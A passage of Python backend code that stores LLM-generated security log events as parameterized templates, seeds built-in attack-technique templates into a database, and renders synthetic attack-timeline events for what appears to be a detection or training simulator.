    if isinstance(obj, dict):
        return {k: _parameterize(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_parameterize(item) for item in obj]
    return obj


async def save_llm_events_as_templates(
    db: AsyncSession,
    technique_id: str,
    events: list[dict[str, Any]],
) -> None:
    """Save LLM-generated events as reusable templates.

    Replaces specific IP/domain/hash values with generic placeholders.
    Marks them as is_builtin=False so they can be distinguished from seed data.
    """
    from sqlalchemy import text as _text

    for event in events:
        source_type = event.get("source_type", "windows_eventlog")
        severity = event.get("severity", "medium")
        title = _parameterize(event.get("title", ""))
        payload = _parameterize(event.get("payload", {}))

        await db.execute(
            _text(
                "INSERT INTO ttp_event_templates "
                "(technique_id, log_source, severity, title_template, payload_template, is_builtin) "
                "VALUES (:tid, :ls, :sev, :tt, :pt::jsonb, false)"
            ),
            {
                "tid": technique_id,
                "ls": source_type,
                "sev": severity,
                "tt": title[:500],
                "pt": __import__("json").dumps(payload),
            },
        )
    await db.commit()


async def seed_builtin_templates(db: AsyncSession) -> int:
    """Insert BUILTIN_TEMPLATES into DB if the technique is not already seeded.

    Returns the count of newly inserted templates.
    """
    from sqlalchemy import select as _select, text as _text
    from backend.db.models import TTPEventTemplate

    # Fetch already-seeded technique IDs to avoid duplicates
    result = await db.execute(
        _text("SELECT DISTINCT technique_id FROM ttp_event_templates WHERE is_builtin = true")
    )
    already_seeded = {row[0] for row in result.fetchall()}

    inserted = 0
    for tmpl in BUILTIN_TEMPLATES:
        tid = tmpl["technique_id"]
        if tid in already_seeded:
            continue
        obj = TTPEventTemplate(
            technique_id=tid,
            tactic=tmpl.get("tactic"),
            log_source=tmpl["log_source"],
            severity=tmpl.get("severity", "medium"),
            title_template=tmpl["title_template"][:500],
            payload_template=tmpl.get("payload_template") or {},
            variables=tmpl.get("variables"),
            is_builtin=True,
            hit_count=0,
        )
        db.add(obj)
        already_seeded.add(tid)
        inserted += 1

    if inserted:
        await db.commit()

    return inserted


# ── High-level event generation ───────────────────────────────────────────────

def generate_events_from_library(
    templates_by_technique: dict[str, list[dict[str, Any]]],
    technique_ids: list[str],
    event_count: int,
    asset_pool: dict[str, Any],
    ioc_pool: list[dict[str, Any]],
    context: Any = None,   # SimulationContext | None
) -> list[dict[str, Any]]:
    """Generate events from library templates.

    Distributes event_count events across available technique_ids.
    When a SimulationContext is provided, all events share the same victim/attacker
    entities regardless of which log source they come from.
    Returns list of rendered event dicts ordered by timestamp ascending.
    """
    if not technique_ids or event_count <= 0:
        return []

    # Flatten available templates for the requested techniques
    available: list[tuple[str, dict[str, Any]]] = []
    for tid in technique_ids:
        # Prefer DB templates; fall back to BUILTIN_TEMPLATES if DB has nothing
        db_tmpls = templates_by_technique.get(tid, [])
        if db_tmpls:
            for t in db_tmpls:
                available.append((tid, t))
        else:
            builtin = [bt for bt in BUILTIN_TEMPLATES if bt["technique_id"] == tid]
            for t in builtin:
                available.append((tid, t))

    if not available:
        return []

    events: list[dict[str, Any]] = []
    # Spread timestamps across a realistic attack window (8 hours = 28800 seconds)
    attack_window_seconds = 28800
    time_step = attack_window_seconds / max(event_count, 1)

    for i in range(event_count):
        tid, template = available[i % len(available)]

        # Normalise DB row (has column names) or builtin dict (has template keys)
        if "title_template" not in template and "title" in template:
            # This is a raw DB row where columns differ — adapt
            adapted = {
                "technique_id": template.get("technique_id", tid),
                "log_source": template.get("log_source", "windows_eventlog"),
                "severity": template.get("severity", "medium"),
                "title_template": template.get("title_template", template.get("title", "")),
                "payload_template": template.get("payload_template", template.get("payload", {})),
            }
            template = adapted

        offset = int(i * time_step)
        event = render_event(template, asset_pool, ioc_pool, timestamp_offset=offset, context=context)
        events.append(event)

    # Sort by timestamp ascending
    events.sort(key=lambda e: e.get("timestamp", ""))
    return events
